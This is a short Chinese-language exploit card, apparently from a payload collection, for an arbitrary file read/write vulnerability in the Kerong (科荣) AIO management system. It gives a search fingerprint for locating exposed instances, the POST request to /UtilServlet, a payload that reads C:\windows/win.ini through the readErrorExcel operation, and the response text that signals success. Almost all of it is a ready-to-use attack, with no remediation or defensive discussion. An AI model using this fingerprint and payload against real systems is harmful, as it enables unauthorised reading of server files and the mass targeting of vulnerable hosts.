# 科荣AIO管理系统文件读取漏洞

科荣AIO管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="changeAccount('8000')"`
- **请求**：`POST /UtilServlet HTTP/1.1`

**Payload**
```
operation=readErrorExcel&fileName=C:\windows/win.ini
```
- **响应特征**：200 support